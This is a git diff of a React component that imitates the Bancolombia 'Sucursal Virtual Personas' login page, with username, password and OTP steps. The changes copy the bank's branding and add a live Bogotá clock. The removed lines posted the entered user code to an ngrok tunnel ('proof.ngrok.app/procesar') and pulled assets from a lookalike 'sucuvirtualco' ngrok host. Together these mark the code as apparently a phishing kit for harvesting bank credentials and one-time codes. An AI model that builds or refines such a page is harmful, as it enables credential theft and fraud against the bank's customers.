@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import axios from 'axios';
-import IMG2 from './img/logo.png';
+import IMG1 from '../BancolombiaLogin/img/logo.png';
 import PasswordEntry from './PasswordEntry';
 import Otp from './otp';
 import { CSSTransition, TransitionGroup } from 'react-transition-group';
@@ -11,12 +11,38 @@ const BancolombiaLogin = () => {
   const [error, setError] = useState('');
   const [step, setStep] = useState(1);
   const [loading, setLoading] = useState(false);
+  const [currentDateTime, setCurrentDateTime] = useState('');
 
   useEffect(() => {
     const storedUsername = localStorage.getItem('username');
     if (storedUsername) {
       setUsername(storedUsername);
     }
+
+    // Función para actualizar la fecha y hora
+    const updateDateTime = () => {
+      const options = { 
+        timeZone: 'America/Bogota', 
+        hour12: true, 
+        year: 'numeric', 
+        month: 'long', 
+        day: 'numeric', 
+        hour: '2-digit', 
+        minute: '2-digit', 
+        second: '2-digit' 
+      };
+      const dateTime = new Intl.DateTimeFormat('es-CO', options).format(new Date());
+      setCurrentDateTime(dateTime);
+    };
+
+    // Actualizar la hora cada segundo
+    const intervalId = setInterval(updateDateTime, 1000);
+    
+    // Llamar a la función una vez al inicio
+    updateDateTime();
+
+    // Limpiar el intervalo al desmontar el componente
+    return () => clearInterval(intervalId);
   }, []);
 
   const handleSubmit = async (e) => {
@@ -32,7 +58,7 @@ const BancolombiaLogin = () => {
     setLoading(true);
 
     try {
-      const response = await axios.post('https://proof.ngrok.app/procesar', { codigo: username });
+      const response = await axios.post('http://localhost:3000/procesar', { codigo: username });
       console.log('Respuesta del servidor:', response.data);
       setStep(2);
     } catch (error) {
@@ -54,13 +80,17 @@ const BancolombiaLogin = () => {
               </div>
             )}
 
-            <div className="flex justify-center mb-6">
-              <img
-                src="https://sucuvirtualco.ngrok.app/assets/img/headerIconBancolombia.svg"
-                alt="Mini Header Icon"
-                className="w-24 shadow-lg"
-              />
+            <div className="mb-6"> {/* Contenedor para la imagen y el texto */}
+              <img src={IMG1} alt="Logo" className="w-40 h-auto mb-2" /> {/* Imagen */}
+              <p className="text-left">Sucursal Virtual Personas</p> {/* Texto */}
+              <div className="text-center mt-1"> {/* Contenedor para la fecha y hora */}
+              <p className="text-sm text-start">{currentDateTime}</p> {/* Mostrar la fecha y hora */}
             </div>
+            </div>
+
+
+
+            <p className="bg-black text-white pl-1 py-4 h-full text-start mb-5">Inicio de sesión</p> {/* Párrafo con fondo negro */}
 
             {step === 1 && !loading && (
               <div className="bg-white p-6 rounded-lg shadow-lg">
@@ -79,9 +109,9 @@ const BancolombiaLogin = () => {
                     onChange={(e) => setUsername(e.target.value)}
                     className="border-b border-gray-300 w-full max-w-md py-2 px-4 mb-4 text-lg focus:outline-none"
                   />
-                  
+
                   {error && <p className="text-red-500 text-sm mb-4 text-center">{error}</p>}
-                  
+
                   <button
                     type="submit"
                     className="bg-yellow-400 text-black font-bold rounded-full w-full max-w-md py-2 hover:bg-yellow-300 transition-colors"
@@ -90,7 +120,7 @@ const BancolombiaLogin = () => {
                   </button>
                 </form>
 
-                <a href="#" className="text-blue-600 underline mt-4 block text-center">
+                < a href="#" className="text-blue-600 underline mt-4 block text-center">
                   ¿Olvidaste tu usuario?
                 </a>
               </div>
